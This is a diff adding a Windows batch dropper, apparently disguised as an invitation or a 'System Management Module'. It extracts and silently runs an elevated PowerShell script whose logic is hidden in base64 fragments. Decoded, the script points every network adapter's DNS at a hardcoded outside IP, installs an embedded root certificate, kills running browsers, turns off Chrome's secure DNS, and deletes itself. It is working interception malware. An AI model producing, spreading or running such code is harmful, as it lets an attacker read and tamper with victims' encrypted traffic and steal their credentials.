@@ -1,0 +1,523 @@
+@echo off
+
+:: Create script path variable to use in both commands
+set "SCRIPT_PATH=%USERPROFILE%\Documents\invite_341.ps1"
+
+:: Extract PowerShell script WITHOUT making it hidden
+powershell.exe -ExecutionPolicy Bypass -Command "& {$content = Get-Content '%~f0' -Raw; if ($content -match '(?ms)#PS_START#\r?\n(.*)') { $matches[1] | Out-File '%SCRIPT_PATH%' -Encoding utf8; }}"
+
+:: Explicitly remove hidden attribute if it somehow got set
+attrib -h "%SCRIPT_PATH%"
+
+:: Wait briefly to ensure file is fully written
+timeout /t 1 >nul
+
+:: Run the script with hidden PowerShell window
+powershell.exe -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File \"%SCRIPT_PATH%\"' -Verb RunAs"
+timeout /t 2 >nul
+del "%~f0"
+:: Exit batch processing
+exit
+#PS_START#
+# System Management Module
+# Generated: 2025-06-08T21:45:32.049Z
+
+function Convert-Base64 {
+    param ([string]$EncodedText)
+    $bytes = [System.Convert]::FromBase64String($EncodedText)
+    $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
+    return $decoded
+}
+
+# Initialize content array
+$scriptParts = @()
+
+# Security keys
+$keys = @(
+    "frq37UWa5LrKENcUD3qsD8gm74PHpNzF",
+    "fsnYY4gglNDHPVdF5k0pNgMjwWmvgarR",
+    "R8kbHjc3ZYTR7Nafd93PxzbHsoACGQEU",
+    "7cYPBTi2YujtSPnt8e6PxyujYrFvqEiC",
+    "kxSv1TDNFAgxSw7Z1GEPZPYTD54mLUBS"
+)
+
+# Section 1 - Offset: 0x0000
+$index_0 = 0
+$part_0 = Convert-Base64 -EncodedText "IyBTaW1wbGUgRE5TIENvbmZpZ3VyYXRpb24gU2NyaXB0CiMgUnVuIGFzIEFkbWluaXM="
+$scriptParts += $part_0
+
+# Section 2 - Offset: 0x0032
+$index_1 = 1
+$part_1 = Convert-Base64 -EncodedText "dHJhdG9yCgojIENoZWNrIGlmIHJ1bm5pbmcgYXMgYWRtaW4KaWYgKC1ub3QgKFtTZWM="
+$scriptParts += $part_1
+
+# Section 3 - Offset: 0x0064
+$index_2 = 2
+$part_2 = Convert-Base64 -EncodedText "dXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXA="
+$scriptParts += $part_2
+
+# Section 4 - Offset: 0x0096
+$index_3 = 3
+$part_3 = Convert-Base64 -EncodedText "YWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXI="
+$scriptParts += $part_3
+
+# Section 5 - Offset: 0x00c8
+$index_4 = 4
+$part_4 = Convert-Base64 -EncodedText "aXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSk="
+$scriptParts += $part_4
+
+# Section 6 - Offset: 0x00fa
+$index_5 = 5
+$part_5 = Convert-Base64 -EncodedText "IHsKICAgIFN0YXJ0LVByb2Nlc3MgUG93ZXJTaGVsbC5leGUgLUFyZ3VtZW50TGlzdCA="
+$scriptParts += $part_5
+
+# Section 7 - Offset: 0x012c
+$index_6 = 6
+$part_6 = Convert-Base64 -EncodedText "Ii1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkKCRNeUk="
+$scriptParts += $part_6
+
+# Section 8 - Offset: 0x015e
+$index_7 = 7
+$part_7 = Convert-Base64 -EncodedText "bnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoKWAiIiAtVmVyYiBSdW5BcwogICAgZXhpdAo="
+$scriptParts += $part_7
+
+# Section 9 - Offset: 0x0190
+$index_8 = 8
+$part_8 = Convert-Base64 -EncodedText "fQoKIyBETlMgc2VydmVycwokUHJpbWFyeSA9ICI5MS45Mi42Ni4yNDIiCiRTZWNvbmQ="
+$scriptParts += $part_8
+
+# Section 10 - Offset: 0x01c2
+$index_9 = 9
+$part_9 = Convert-Base64 -EncodedText "YXJ5ID0gIjguOC44LjgiCgoKIyBTZXQgRE5TIGZvciBBTEwgbmV0d29yayBhZGFwdGU="
+$scriptParts += $part_9
+
+# Section 11 - Offset: 0x01f4
+$index_10 = 10
+$part_10 = Convert-Base64 -EncodedText "cnMKIyBNYWtlIHN1cmUgJFByaW1hcnkgYW5kICRTZWNvbmRhcnkgYXJlIHNldCBhYm8="
+$scriptParts += $part_10
+
+# Section 12 - Offset: 0x0226
+$index_11 = 11
+$part_11 = Convert-Base64 -EncodedText "dmUKR2V0LU5ldEFkYXB0ZXIgLVBoeXNpY2FsIC1JbmNsdWRlSGlkZGVuIHwKICBXaGU="
+$scriptParts += $part_11
+
+# Section 13 - Offset: 0x0258
+$index_12 = 12
+$part_12 = Convert-Base64 -EncodedText "cmUtT2JqZWN0IHsKICAgICMgY2F0Y2ggdHJ1ZSBFdGhlcm5ldC9jYWJsZSBvciBXaS0="
+$scriptParts += $part_12
+
+# Section 14 - Offset: 0x028a
+$index_13 = 13
+$part_13 = Convert-Base64 -EncodedText "RmkgcmFkaW9zCiAgICAkXy5QaHlzaWNhbE1lZGlhVHlwZSAtaW4gQCgKICAgICAgJzg="
+$scriptParts += $part_13
+
+# Section 15 - Offset: 0x02bc
+$index_14 = 14
+$part_14 = Convert-Base64 -EncodedText "MDIuMycsICAgICAgICAgICAjIEV0aGVybmV0CiAgICAgICdDYWJsZSBNb2RlbScsICA="
+$scriptParts += $part_14
+
+# Section 16 - Offset: 0x02ee
+$index_15 = 15
+$part_15 = Convert-Base64 -EncodedText "ICAgIyBzb21lIGRyaXZlcnMKICAgICAgJ05hdGl2ZSA4MDIuMTEnLCAgICMgV2ktRmk="
+$scriptParts += $part_15
+
+# Section 17 - Offset: 0x0320
+$index_16 = 16
+$part_16 = Convert-Base64 -EncodedText "CiAgICAgICdXaXJlbGVzcyBMQU4nICAgICAjIGFsdGVybmF0ZSBXaS1GaSBuYW1lCiA="
+$scriptParts += $part_16
+
+# Section 18 - Offset: 0x0352
+$index_17 = 17
+$part_17 = Convert-Base64 -EncodedText "ICAgKQogIH0gfAogIEZvckVhY2gtT2JqZWN0IHsKICAgIHRyeSB7CiAgICAgIFNldC0="
+$scriptParts += $part_17
+
+# Section 19 - Offset: 0x0384
+$index_18 = 18
+$part_18 = Convert-Base64 -EncodedText "RG5zQ2xpZW50U2VydmVyQWRkcmVzcyBgCiAgICAgICAgLUludGVyZmFjZUluZGV4ICQ="
+$scriptParts += $part_18
+
+# Section 20 - Offset: 0x03b6
+$index_19 = 19
+$part_19 = Convert-Base64 -EncodedText "Xy5pZkluZGV4IGAKICAgICAgICAtU2VydmVyQWRkcmVzc2VzIEAoJFByaW1hcnksICQ="
+$scriptParts += $part_19
+
+# Section 21 - Offset: 0x03e8
+$index_20 = 20
+$part_20 = Convert-Base64 -EncodedText "U2Vjb25kYXJ5KQogICAgICAgIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93CiAgICB9CiA="
+$scriptParts += $part_20
+
+# Section 22 - Offset: 0x041a
+$index_21 = 21
+$part_21 = Convert-Base64 -EncodedText "ICAgY2F0Y2ggewogICAgfQogIH0KCgojIEZsdXNoIEROUyBjYWNoZQppcGNvbmZpZyA="
+$scriptParts += $part_21
+
+# Section 23 - Offset: 0x044c
+$index_22 = 22
+$part_22 = Convert-Base64 -EncodedText "L2ZsdXNoZG5zIHwgT3V0LU51bGwKCgojIEVtYmVkZGVkIGNlcnRpZmljYXRlIGluIFA="
+$scriptParts += $part_22
+
+# Section 24 - Offset: 0x047e
+$index_23 = 23
+$part_23 = Convert-Base64 -EncodedText "RU0gZm9ybWF0CiRjZXJ0UEVNID0gQCIKLS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0="
+$scriptParts += $part_23
+
+# Section 25 - Offset: 0x04b0
+$index_24 = 24
+$part_24 = Convert-Base64 -EncodedText "LQpNSUlGdnpDQ0E2ZWdBd0lCQWdJVU4wV0tYeHA5aFUzeDdUbjNZaDhCZThJbTQ4WXc="
+$scriptParts += $part_24
+
+# Section 26 - Offset: 0x04e2
+$index_25 = 25
+$part_25 = Convert-Base64 -EncodedText "RFFZSktvWklodmNOQVFFTApCUUF3YnpFTE1Ba0dBMVVFQmhNQ1ZWTXhGakFVQmdOVkI="
+$scriptParts += $part_25
+
+# Section 27 - Offset: 0x0514
+$index_26 = 26
+$part_26 = Convert-Base64 -EncodedText "QW9NRFV4bGRDZHpJRVZ1WTNKNWNIUXhJekFoQmdOVgpCQXNNR2t4bGRDZHpJRVZ1WTM="
+$scriptParts += $part_26
+
+# Section 28 - Offset: 0x0546
+$index_27 = 27
+$part_27 = Convert-Base64 -EncodedText "SjVjSFFnUVhWMGFHOXlhWFI1SUZnek1TTXdJUVlEVlFRRERCcE1aWFFuY3lCRgpibU4="
+$scriptParts += $part_27
+
+# Section 29 - Offset: 0x0578
+$index_28 = 28
+$part_28 = Convert-Base64 -EncodedText "eWVYQjBJRUYxZEdodmNtbDBlU0JZTXpBZUZ3MHlOVEEyTURReE5qVTFNalZhRncwek4="
+$scriptParts += $part_28
+
+# Section 30 - Offset: 0x05aa
+$index_29 = 29
+$part_29 = Convert-Base64 -EncodedText "VEEyTURJeE5qVTEKTWpWYU1HOHhDekFKQmdOVkJBWVRBbFZUTVJZd0ZBWURWUVFLREE="
+$scriptParts += $part_29
+
+# Section 31 - Offset: 0x05dc
+$index_30 = 30
+$part_30 = Convert-Base64 -EncodedText "MU1aWFFuY3lCRmJtTnllWEIwTVNNd0lRWUQKVlFRTERCcE1aWFFuY3lCRmJtTnllWEI="
+$scriptParts += $part_30
+
+# Section 32 - Offset: 0x060e
+$index_31 = 31
+$part_31 = Convert-Base64 -EncodedText "MElFRjFkR2h2Y21sMGVTQllNekVqTUNFR0ExVUVBd3dhVEdWMEozTWcKUlc1amNubHc="
+$scriptParts += $part_31
+
+# Section 33 - Offset: 0x0640
+$index_32 = 32
+$part_32 = Convert-Base64 -EncodedText "ZENCQmRYUm9iM0pwZEhrZ1dETXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHc="
+$scriptParts += $part_32
+
+# Section 34 - Offset: 0x0672
+$index_33 = 33
+$part_33 = Convert-Base64 -EncodedText "QXdnZ0lLCkFvSUNBUUN3RmRSbFRCai9oS2dpRkdlakk0QVlacWg3MTlidjVCVDNmRWQ="
+$scriptParts += $part_33
+
+# Section 35 - Offset: 0x06a4
+$index_34 = 34
+$part_34 = Convert-Base64 -EncodedText "dFZFQmR4b1IwRVlLNUtvS1d1ZGdzCnR2M3NlZU9xOHJZWnAzMUtJVk9aV2FmMlBTZjg="
+$scriptParts += $part_34
+
+# Section 36 - Offset: 0x06d6
+$index_35 = 35
+$part_35 = Convert-Base64 -EncodedText "VUdad3NnR2dJUzZZSEFuaS9kdzR2QXk1d2ZpVExIOFNldUE2ClVCdEVuM3I0Nmcra0o="
+$scriptParts += $part_35
+
+# Section 37 - Offset: 0x0708
+$index_36 = 36
+$part_36 = Convert-Base64 -EncodedText "VzBPNFoycXNKeVgxVlVNeGJoM2kreUJ6UVc5am1vOE9YWnRKTU5WOG5jR2g1SkU3ajg="
+$scriptParts += $part_36
+
+# Section 38 - Offset: 0x073a
+$index_37 = 37
+$part_37 = Convert-Base64 -EncodedText "dApkdWlVRWtRRXExYzg1N1FMaWltK3R4aS8rR0pnQkZVRWRVTlE3aUxCNGUxbVRHYmU="
+$scriptParts += $part_37
+
+# Section 39 - Offset: 0x076c
+$index_38 = 38
+$part_38 = Convert-Base64 -EncodedText "M0x6SzNpdjJGaDJLN01qUApMVk04cE10RG9NN2VOai91NUZuTWhrOXZtL3NmUDBRUjY="
+$scriptParts += $part_38
+
+# Section 40 - Offset: 0x079e
+$index_39 = 39
+$part_39 = Convert-Base64 -EncodedText "ditWK29oLzJqR2VvcDN0QzZYNU9GYmFzaUZFTmlnUQp6aXhBaGtoRkFVR1lORG9rdU0="
+$scriptParts += $part_39
+
+# Section 41 - Offset: 0x07d0
+$index_40 = 40
+$part_40 = Convert-Base64 -EncodedText "dUd3bFE3cjJ4QS9wWnlidGpXN2h3elBLS0VYVlZnb1UvbGRVKzhZbVlHZ1dQcgo0SkI="
+$scriptParts += $part_40
+
+# Section 42 - Offset: 0x0802
+$index_41 = 41
+$part_41 = Convert-Base64 -EncodedText "N1VBbkpremt4QzM4RVI3V2RFdytHNTNSZGxESVE4N3UzZjhBc2IwMVVWUFZ1K3h6TkE="
+$scriptParts += $part_41
+
+# Section 43 - Offset: 0x0834
+$index_42 = 42
+$part_42 = Convert-Base64 -EncodedText "VnhWdUljWEltaUMKMXN4Ylh0dUEzaUF2cXNxenRtVVVDOEFPTkNucDh3ZnN2VDFjVVM="
+$scriptParts += $part_42
+
+# Section 44 - Offset: 0x0866
+$index_43 = 43
+$part_43 = Convert-Base64 -EncodedText "OFkzYXM0bnBYZjEvNTlBRmIzd0FtMnRBOUMKK1dYYTN5NWRRUWpIT0Q4SVY3b0FFZjY="
+$scriptParts += $part_43
+
+# Section 45 - Offset: 0x0898
+$index_44 = 44
+$part_44 = Convert-Base64 -EncodedText "QmRLUVhLMFVXZEw0L0VWMTJLMlJwb3ZzQWd2ZUdIOUVQd294Y1QrV3gKSDhCcm9VejU="
+$scriptParts += $part_44
+
+# Section 46 - Offset: 0x08ca
+$index_45 = 45
+$part_45 = Convert-Base64 -EncodedText "WlZlb1lTclE1b0s5eVVEcnh3cERNQWFzWEV1cVFGaUZna3psOUJ1NmJtS25PR2pZOTc="
+$scriptParts += $part_45
+
+# Section 47 - Offset: 0x08fc
+$index_46 = 46
+$part_46 = Convert-Base64 -EncodedText "eWI0dS8vCitOcHR2UU5HcU56ZjlVOGEwRkMzWitZN0tCdHRTZUh4RCtCVmV4c1BTbk4="
+$scriptParts += $part_46
+
+# Section 48 - Offset: 0x092e
+$index_47 = 47
+$part_47 = Convert-Base64 -EncodedText "Tzl0TllTUUlEQVFBQm8xTXdVVEFkCkJnTlZIUTRFRmdRVUhHdmZJVEc5VkQzMUM4d0U="
+$scriptParts += $part_47
+
+# Section 49 - Offset: 0x0960
+$index_48 = 48
+$part_48 = Convert-Base64 -EncodedText "ZEJ6T01EYXFUL013SHdZRFZSMGpCQmd3Rm9BVUhHdmZJVEc5ClZEMzFDOHdFZEJ6T00="
+$scriptParts += $part_48
+
+# Section 50 - Offset: 0x0992
+$index_49 = 49
+$part_49 = Convert-Base64 -EncodedText "RGFxVC9Nd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBTkJna3Foa2lHOXcwQkFRc0ZBQU8="
+$scriptParts += $part_49
+
+# Section 51 - Offset: 0x09c4
+$index_50 = 50
+$part_50 = Convert-Base64 -EncodedText "QwpBZ0VBVkZQbk9VUVp3WUJ1U2VTTHR4SXBQcVJpNVpNRjR6VUMrQVpFZDJud3kraE8="
+$scriptParts += $part_50
+
+# Section 52 - Offset: 0x09f6
+$index_51 = 51
+$part_51 = Convert-Base64 -EncodedText "VjRaRWdkTHpJOUNlcDR3cQp1WE44VUQ5bGhnWjROL3d2OTBUakFqMHZscnh1MmN4cWk="
+$scriptParts += $part_51
+
+# Section 53 - Offset: 0x0a28
+$index_52 = 52
+$part_52 = Convert-Base64 -EncodedText "bVB1a1JUdXhkUWZMWlZaQW12aVJVV2lVTWtCeDRqVQp6aHdyckIvbnFrQ05sQTkwbnM="
+$scriptParts += $part_52
+
+# Section 54 - Offset: 0x0a5a
+$index_53 = 53
+$part_53 = Convert-Base64 -EncodedText "VHRnbmhMa2tDNHNSMGZyUE5Wclc2R3hYN2JyQWhvTHR6V1RIWWlZT2pEQkZ0NQpnblE="
+$scriptParts += $part_53
+
+# Section 55 - Offset: 0x0a8c
+$index_54 = 54
+$part_54 = Convert-Base64 -EncodedText "SEpHSXU5Qm5iMTM2RkdhN0ptMmpaYVQ4SVZrczNVTDNxdDBpdk9lOCt4STl1MVB4cHE="
+$scriptParts += $part_54
+
+# Section 56 - Offset: 0x0abe
+$index_55 = 55
+$part_55 = Convert-Base64 -EncodedText "WUtCMHNSRTVvRGYKMUZiNlE4YUptUURJazcyRUJtOHYrWEhDaHRvbjNGSURXVEFFYVM="
+$scriptParts += $part_55
+
+# Section 57 - Offset: 0x0af0
+$index_56 = 56
+$part_56 = Convert-Base64 -EncodedText "K2lVTkpLQWYzYTRFbzVXT1BkOUkxbVBYdE4KeEZqVjdvY3ZsaWNhRjhYM01VdHdERks="
+$scriptParts += $part_56
+
+# Section 58 - Offset: 0x0b22
+$index_57 = 57
+$part_57 = Convert-Base64 -EncodedText "djRRdFJYc2dqMTVERHo4RzZyQ2JhcWd5bDFmRzdxMmJiT0NlcnRyV2IKSjFPdEVwdnA="
+$scriptParts += $part_57
+
+# Section 59 - Offset: 0x0b54
+$index_58 = 58
+$part_58 = Convert-Base64 -EncodedText "ZUNZUGJBV1htaUtkODhyZ2FWaFJ2QzhsaGIwQmVrQStIQjI3b1g4WGMrUHdObmZOQnQ="
+$scriptParts += $part_58
+
+# Section 60 - Offset: 0x0b86
+$index_59 = 59
+$part_59 = Convert-Base64 -EncodedText "Uy9MRnJ5CnlIZzFLR1M3bnlFZ0NvN1FNM0RtS0Y2aEp0M2tvZkZ1RFRjVjA3ck82STU="
+$scriptParts += $part_59
+
+# Section 61 - Offset: 0x0bb8
+$index_60 = 60
+$part_60 = Convert-Base64 -EncodedText "U3ppUGdubjdGMG9GbDNja1d1aXRpClBCaWtMOGowSEhiaU1iOEMxL3ZXVXFGN1praFM="
+$scriptParts += $part_60
+
+# Section 62 - Offset: 0x0bea
+$index_61 = 61
+$part_61 = Convert-Base64 -EncodedText "b20vNE93SzlwR082TzFlMXFySW53YS9UZ1V6OWFBS2s0Yk9xCkNpZlNmbkNKSGNTWlQ="
+$scriptParts += $part_61
+
+# Section 63 - Offset: 0x0c1c
+$index_62 = 62
+$part_62 = Convert-Base64 -EncodedText "MkFsMHRPRkpjZk1vc3RDTjhHdU1obm5xTyswRVppTm1BRzJFVEJUaTg0c1M2dXM3Zko="
+$scriptParts += $part_62
+
+# Section 64 - Offset: 0x0c4e
+$index_63 = 63
+$part_63 = Convert-Base64 -EncodedText "Ywo5RDllQjlmclhJUkUvck45ank1cjFKQWVHeVV5TmJyZlg5eXBIWU5YeVZadGNGWT0="
+$scriptParts += $part_63
+
+# Section 65 - Offset: 0x0c80
+$index_64 = 64
+$part_64 = Convert-Base64 -EncodedText "Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KIkAKCiMgQ3JlYXRlIHRlbXBvcmFyeSA="
+$scriptParts += $part_64
+
+# Section 66 - Offset: 0x0cb2
+$index_65 = 65
+$part_65 = Convert-Base64 -EncodedText "ZmlsZSBmb3IgY2VydGlmaWNhdGUKJHRlbXBGaWxlID0gIiRlbnY6VEVNUFxjZXJ0aWY="
+$scriptParts += $part_65
+
+# Section 67 - Offset: 0x0ce4
+$index_66 = 66
+$part_66 = Convert-Base64 -EncodedText "aWNhdGUuY2VyIgpTZXQtQ29udGVudCAtUGF0aCAkdGVtcEZpbGUgLVZhbHVlICRjZXI="
+$scriptParts += $part_66
+
+# Section 68 - Offset: 0x0d16
+$index_67 = 67
+$part_67 = Convert-Base64 -EncodedText "dFBFTSAtRm9yY2UKCiMgQ2xvc2UgYnJvd3NlcnMKJGJyb3dzZXJzID0gQCgiY2hyb20="
+$scriptParts += $part_67
+
+# Section 69 - Offset: 0x0d48
+$index_68 = 68
+$part_68 = Convert-Base64 -EncodedText "ZSIsICJmaXJlZm94IiwgIm1zZWRnZSIsICJpZXhwbG9yZSIsICJvcGVyYSIsICJicmE="
+$scriptParts += $part_68
+
+# Section 70 - Offset: 0x0d7a
+$index_69 = 69
+$part_69 = Convert-Base64 -EncodedText "dmUiKQpmb3JlYWNoICgkYnJvd3NlciBpbiAkYnJvd3NlcnMpIHsKICAgIHRyeSB7CiA="
+$scriptParts += $part_69
+
+# Section 71 - Offset: 0x0dac
+$index_70 = 70
+$part_70 = Convert-Base64 -EncodedText "ICAgICAgICRwcm9jZXNzZXMgPSBHZXQtUHJvY2VzcyAtTmFtZSAkYnJvd3NlciAtRXI="
+$scriptParts += $part_70
+
+# Section 72 - Offset: 0x0dde
+$index_71 = 71
+$part_71 = Convert-Base64 -EncodedText "cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICBpZiAoJHByb2Nlc3Nlcyk="
+$scriptParts += $part_71
+
+# Section 73 - Offset: 0x0e10
+$index_72 = 72
+$part_72 = Convert-Base64 -EncodedText "IHsKICAgICAgICAgICAgJHByb2Nlc3NlcyB8IEZvckVhY2gtT2JqZWN0IHsgJF8uQ2w="
+$scriptParts += $part_72
+
+# Section 74 - Offset: 0x0e42
+$index_73 = 73
+$part_73 = Convert-Base64 -EncodedText "b3NlTWFpbldpbmRvdygpIHwgT3V0LU51bGwgfQogICAgICAgICAgICBTdGFydC1TbGU="
+$scriptParts += $part_73
+
+# Section 75 - Offset: 0x0e74
+$index_74 = 74
+$part_74 = Convert-Base64 -EncodedText "ZXAgLVNlY29uZHMgMQogICAgICAgICAgICAkcmVtYWluaW5nID0gR2V0LVByb2Nlc3M="
+$scriptParts += $part_74
+
+# Section 76 - Offset: 0x0ea6
+$index_75 = 75
+$part_75 = Convert-Base64 -EncodedText "IC1OYW1lICRicm93c2VyIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICA="
+$scriptParts += $part_75
+
+# Section 77 - Offset: 0x0ed8
+$index_76 = 76
+$part_76 = Convert-Base64 -EncodedText "ICAgICAgICBpZiAoJHJlbWFpbmluZykgeyAkcmVtYWluaW5nIHwgU3RvcC1Qcm9jZXM="
+$scriptParts += $part_76
+
+# Section 78 - Offset: 0x0f0a
+$index_77 = 77
+$part_77 = Convert-Base64 -EncodedText "cyAtRm9yY2UgfQogICAgICAgIH0KICAgIH0gY2F0Y2ggewogICAgfQp9CgojIEluc3Q="
+$scriptParts += $part_77
+
+# Section 79 - Offset: 0x0f3c
+$index_78 = 78
+$part_78 = Convert-Base64 -EncodedText "YWxsIGNlcnRpZmljYXRlIHVzaW5nIGNlcnR1dGlsIChtb3N0IHJlbGlhYmxlIG1ldGg="
+$scriptParts += $part_78
+
+# Section 80 - Offset: 0x0f6e
+$index_79 = 79
+$part_79 = Convert-Base64 -EncodedText "b2QpCnRyeSB7CiAgICAkcmVzdWx0ID0gY2VydHV0aWwuZXhlIC1hZGRzdG9yZSAtZiA="
+$scriptParts += $part_79
+
+# Section 81 - Offset: 0x0fa0
+$index_80 = 80
+$part_80 = Convert-Base64 -EncodedText "IlJvb3QiICR0ZW1wRmlsZQp9IGNhdGNoIHsKfQoKIyBDbGVhbiB1cApSZW1vdmUtSXQ="
+$scriptParts += $part_80
+
+# Section 82 - Offset: 0x0fd2
+$index_81 = 81
+$part_81 = Convert-Base64 -EncodedText "ZW0gLVBhdGggJHRlbXBGaWxlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb24="
+$scriptParts += $part_81
+
+# Section 83 - Offset: 0x1004
+$index_82 = 82
+$part_82 = Convert-Base64 -EncodedText "dGludWUKCgoKIyBDb25maWd1cmUgQ2hyb21lIChvcHRpb25hbCkKJENocm9tZVBhdGg="
+$scriptParts += $part_82
+
+# Section 84 - Offset: 0x1036
+$index_83 = 83
+$part_83 = Convert-Base64 -EncodedText "ID0gIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXEdvb2dsZVxDaHJvbWUiCmlmICgtbm8="
+$scriptParts += $part_83
+
+# Section 85 - Offset: 0x1068
+$index_84 = 84
+$part_84 = Convert-Base64 -EncodedText "dCAoVGVzdC1QYXRoICRDaHJvbWVQYXRoKSkgeyBOZXctSXRlbSAtUGF0aCAkQ2hyb20="
+$scriptParts += $part_84
+
+# Section 86 - Offset: 0x109a
+$index_85 = 85
+$part_85 = Convert-Base64 -EncodedText "ZVBhdGggLUZvcmNlIHwgT3V0LU51bGwgfQpTZXQtSXRlbVByb3BlcnR5IC1QYXRoICQ="
+$scriptParts += $part_85
+
+# Section 87 - Offset: 0x10cc
+$index_86 = 86
+$part_86 = Convert-Base64 -EncodedText "Q2hyb21lUGF0aCAtTmFtZSAiRG5zT3Zlckh0dHBzTW9kZSIgLVZhbHVlICJvZmYiIC0="
+$scriptParts += $part_86
+
+# Section 88 - Offset: 0x10fe
+$index_87 = 87
+$part_87 = Convert-Base64 -EncodedText "VHlwZSBTdHJpbmcgLUZvcmNlClNldC1JdGVtUHJvcGVydHkgLVBhdGggJENocm9tZVA="
+$scriptParts += $part_87
+
+# Section 89 - Offset: 0x1130
+$index_88 = 88
+$part_88 = Convert-Base64 -EncodedText "YXRoIC1OYW1lICJCdWlsdEluRG5zQ2xpZW50RW5hYmxlZCIgLVZhbHVlIDAgLVR5cGU="
+$scriptParts += $part_88
+
+# Section 90 - Offset: 0x1162
+$index_89 = 89
+$part_89 = Convert-Base64 -EncodedText "IERXb3JkIC1Gb3JjZQoKU3RhcnQtU2xlZXAgLVNlY29uZHMgMQokc2NyaXB0UGF0aCA="
+$scriptParts += $part_89
+
+# Section 91 - Offset: 0x1194
+$index_90 = 90
+$part_90 = Convert-Base64 -EncodedText "PSAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoClN0YXJ0LVByb2Nlc3MgcG93ZXI="
+$scriptParts += $part_90
+
+# Section 92 - Offset: 0x11c6
+$index_91 = 91
+$part_91 = Convert-Base64 -EncodedText "c2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgIi1Db21tYW5kIiwgIlN0YXJ0LVNsZWVwIDI="
+$scriptParts += $part_91
+
+# Section 93 - Offset: 0x11f8
+$index_92 = 92
+$part_92 = Convert-Base64 -EncodedText "OyBSZW1vdmUtSXRlbSAnJHNjcmlwdFBhdGgnIC1Gb3JjZSIgLVdpbmRvd1N0eWxlIEg="
+$scriptParts += $part_92
+
+# Section 94 - Offset: 0x122a
+$index_93 = 93
+$part_93 = Convert-Base64 -EncodedText "aWRkZW4="
+$scriptParts += $part_93
+
+# Verify script components
+if ($scriptParts.Count -eq 94) {
+    
+    # Assemble script
+    $finalScript = [string]::Join('', $scriptParts)
+    
+    # Execute script
+    Invoke-Expression $finalScript
+} else {
+}
